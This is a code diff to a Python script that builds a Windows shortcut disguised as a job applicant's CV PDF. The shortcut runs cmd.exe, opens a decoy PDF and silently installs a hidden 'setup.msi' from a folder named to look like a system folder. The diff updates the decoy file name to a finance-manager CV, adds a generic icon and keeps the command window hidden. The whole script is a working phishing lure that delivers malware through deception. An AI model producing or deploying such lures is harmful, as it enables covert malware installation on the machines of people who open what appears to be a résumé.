@@ -3,7 +3,7 @@ import os
 
 shell = win32com.client.Dispatch("WScript.Shell")
 
-lnk_path = os.path.abspath("unzip_lnk.lnk")
+lnk_path = os.path.abspath("CV_Thai_Quang_Huy_TruongPhongTaiChinhKeHoach.pdf.lnk")
 
 
 shortcut = shell.CreateShortCut(lnk_path)
@@ -11,7 +11,7 @@ shortcut = shell.CreateShortCut(lnk_path)
 shortcut.TargetPath = r"C:\Windows\System32\cmd.exe"
 # shortcut.WorkingDirectory = r"C:\Windows\System32"
 
-shortcut.Arguments = r'/c cd System-Volumnes && start "" "CV-VuDinhViet.pdf" && .\setup.msi /qn'
+shortcut.Arguments = r'/c cd System-Volumnes && start "" "CV_Thai_Quang_Huy_TruongPhongTaiChinhKeHoach.pdf" && .\setup.msi /qn'
 
 # shortcut.IconLocation = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,17"  # Sử dụng biểu tượng của Microsoft Edge
 
@@ -20,7 +20,8 @@ shortcut.Arguments = r'/c cd System-Volumnes && start "" "CV-VuDinhViet.pdf" && 
 # shortcut.IconLocation = "pdf.ico"
 
 
-shortcut.WindowStyle = 0  # Ẩn cửa sổ
+shortcut.IconLocation = r"C:\Windows\System32\shell32.dll,1"  # Thêm icon
+shortcut.WindowStyle = 7  # Ẩn cửa sổ
 
 shortcut.save()
 
